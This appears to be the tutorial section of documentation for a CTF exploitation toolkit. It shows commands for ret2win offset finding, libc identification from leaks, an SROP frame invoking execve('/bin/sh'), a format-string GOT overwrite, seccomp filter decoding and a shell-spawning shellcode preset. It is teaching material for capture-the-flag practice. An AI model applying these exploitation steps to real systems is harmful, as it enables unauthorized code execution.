# Tutorials

End-to-end walkthroughs of the `abcpwn` workflow for common CTF
binary-exploitation tasks. So the commands run verbatim on any Linux
box, every shell block here uses `/bin/ls` (a binary you already have)
or pure `abcpwn` operations that need no target file. Substitute your
own challenge binary where you see `/bin/ls`.

Blocks marked as plain output (not `bash`) are illustrative -- sample
leaks, addresses, and program output you would see during a real
engagement.

The commands assume `abcpwn` is on your `PATH`.

## 1. Recon and offset discovery for a ret2win

A "ret2win" is the canonical first stack-overflow challenge: the binary
contains a function (often `win`) that prints the flag, but no normal
control flow reaches it. The exploit overflows a stack buffer to
redirect the saved return address to `win`.

### Inspect the binary

```bash
abcpwn info /bin/ls
```

The mitigation report tells you what you are up against -- NX (can you
execute the stack?), PIE (are addresses absolute or relative?), and the
stack canary (do you need a leak first?).

### Look for interesting imports

```bash
abcpwn syms /bin/ls --dangerous
```

`--dangerous` flags risky imports (`gets`, `system`, `scanf`, ...). In a
real ret2win you would instead look for the `win`/`flag` symbol and note
its address, say `0x401200`.

### Find the buffer offset

Generate a cyclic pattern, feed it to the crashing input, and recover
the offset of the four bytes that landed in the saved return address:

```bash
abcpwn cyclic 200
```

After the crash you read the faulting value out of the debugger (say
`0x6161616a`) and look up its offset:

```bash
abcpwn cyclic --find 0x6161616a
```

The integer form is interpreted little-endian, matching
`pwntools.cyclic_find`.

### Scaffold the payload and a solve script

```bash
abcpwn pack 0x401200
```

`pack` emits the little-endian bytes of the target address. To get a
full pwntools-shaped starting point:

```bash
abcpwn template ret2win /bin/ls -o /tmp/solve.py
```

Edit the `OFFSET` and target tube in the generated `/tmp/solve.py`.

## 2. Identifying a libc with `abcpwn libc id`

You have leaks from a remote process and need to know which libc it
runs so you can compute correct offsets. Only the low 12 bits of each
leak matter (the page-aligned offset within libc):

```
puts   @ 0x7f0011aabbb0   ->  0xbb0
printf @ 0x7f0011aaca50   ->  0xa50
```

Feed the low bits to `libc id`:

```bash
abcpwn libc id --offset puts:0xbb0 --offset printf:0xa50
```

It prints the matching libc id, or a short candidate list when two
libcs share those low bits. With an id in hand you would fetch the rest
of the offsets (`abcpwn libc offsets <id>`) or, with `--allow-network`,
download the matching `libc.so.6` (`abcpwn libc download <id>`); both
are illustrated rather than run here since they need a populated
database or network access.

## 3. Building a SROP frame

Sigreturn-Oriented Programming uses the kernel's `rt_sigreturn`
machinery to set every register from a stack-resident frame in a single
gadget -- handy when you have one write and a `syscall` gadget.

### Find a syscall gadget

```bash
abcpwn gadget /bin/ls --type all --filter 'syscall' --no-progress
```

Pick a `syscall` (or `syscall ; ret`) hit; that address is where your
frame's `rip` will point.

### Look up syscall constants

```bash
abcpwn constgrep sig --category signal
```

On x86_64 `rt_sigreturn` is syscall 15; the frame below instead targets
`execve` (59).

### Build the frame

```bash
abcpwn srop --arch x86_64 --rip 0x401234 --rsp 0x404300 \
    --syscall 59 --syscall-arg 0x404308 --syscall-arg 0 --syscall-arg 0
```

`0x401234` is your `syscall` gadget, `0x404308` is where `/bin/sh\0`
lives on the stack you control. Concatenate the emitted frame behind the
gadget address. A solve skeleton:

```bash
abcpwn template srop /bin/ls -o /tmp/solve_srop.py
```

## 4. Format string: offset, then write

A format-string bug gives both a read (`%s`, `%n`) and a write (`%n`,
`%hn`, `%hhn`). First find where your input lands. Send a probe like
`AAAA%x.%x.%x.%x` and capture the output; the marker `AAAA` is
`0x41414141`:

```bash
abcpwn fmt --find-offset '11.41414141.22'
```

The printed index is the positional argument where your input starts.
With that index, build a GOT overwrite -- here `puts@got` (`0x404020`)
redirected to a `win` at `0x4011aa` from arg position 7:

```bash
abcpwn fmt --write 0x404020=0x4011aa --arg-position 7
```

The payload uses `%hn` two-byte writes to avoid the counter inflation of
a four-byte `%n`. A solve skeleton:

```bash
abcpwn template fmt-leak /bin/ls -o /tmp/solve_fmt.py
```

## 5. Reading and reasoning about a seccomp filter

CTF challenges often install a seccomp filter restricting syscalls. The
filter is a classic-BPF program; once you have its bytes (from
`strace -f -e trace=prctl,seccomp`, a debugger, or `abcpwn seccomp dump`
on a binary that embeds a static filter) you can decode it:

```bash
abcpwn seccomp disasm 2000000004000000150001003e0000c006000000000000002000000000000000150000013b0000000600000000000000060000000000ff7f
```

The output is human-readable cBPF: load arch, load the syscall number,
compare against the allowed list, then `ALLOW` or `KILL`. A filter that
permits only `read`/`write`/`exit` means no `execve` -- you need
open/read/write shellcode instead. The shipped `sh` preset:

```bash
abcpwn shellcode --preset sh --arch x86_64
```

Confirm what a payload actually does by disassembling its bytes:

```bash
abcpwn disasm 9090c3 --arch x86_64
```

(Here `90 90 c3` is just `nop; nop; ret`; pipe real shellcode bytes
through `disasm` to audit the syscalls it makes.)
